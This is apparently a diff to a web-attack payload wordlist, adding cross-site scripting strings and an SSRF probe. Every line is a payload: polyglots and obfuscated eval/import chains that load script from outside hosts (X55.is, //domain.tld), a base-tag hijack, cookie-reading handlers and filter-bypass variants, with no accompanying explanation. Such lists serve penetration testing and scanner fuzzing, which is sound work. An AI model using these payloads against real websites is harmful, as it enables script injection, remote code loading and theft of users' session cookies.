@@ -1,7 +1,16 @@
 JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\http://X55.is/.source))}//\76-->
 'Src="//X55.is/>?<Script/K='
 <script>alert(0)</script>
+"><base href=//hacker>
 ["');alert('XSS');//"]@xyz.xxx
+<script>a="import\x28"</script>
+<script>b="`//0-a\x2e"</script>
+<script>c="nl`\x29"</script><script>d=setTimeout</script><script>e=eval</script><script>f=`${a}${b}${c}`</script><script>d`e\x28f\x29`</script>
+kuromatae"><textarea/onbeforeinput=kuro=&#x27;//domain.tld&#x27;;import(kuro)%09autofocus%09x>
+<textarea/onbeforeinput=kuro=&#x27;//domain.tld&#x27;;import(kuro)%09autofocus%09x>
+/?xss=<svg/onload=eval(`'`+URL)>#';alert(document.domain)
+<</div>script</div>>alert()<</div>/script</div>>
+#"></div><a href= javascript&colon;alert&lpar;document&period;domain)
 "%22onmouseover=window[%27al%27%2B%27er%27%2B([%27t%27,%27b%27,%27c%27][0])](document[%27cooki%27%2B(['e','c','z'][0])]);%22",
 "%22onmouseover=window[%27al%27%2B%27er%27%2B([%27t%27,%27b%27,%27c%27][0])](document[%27cooki%27%2B(['e','c','z'][0])]);%22",
 "%22onmouseover=window[%27al%27%2B%27er%27%2B([%27t%27,%27b%27,%27c%27][0])](document[%27cooki%27%2B(['e','c','z'][0])]);%22",
@@ -9,6 +18,8 @@ JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Scri
 "%22onmouseover=window[%27al%27%2B%27er%27%2B([%27t%27,%27b%27,%27c%27][0])](document[%27cooki%27%2B(['e','c','z'][0])]);%22",
 "%22onmouseover=window[%27al%27%2B%27er%27%2B([%27t%27,%27b%27,%27c%27][0])](document[%27cooki%27%2B(['e','c','z'][0])]);%22",
 <img/src="x"/onerror=prompt()>
+onerror=alert,[1].map(reportError)
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
 test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
 12345-abc-1-23456<scr<script>ipt>alert(document.cookie)<%2Fscr<script>ipt>.img
 SSRF +441134960000;phone-context=http://burocoaborator.net
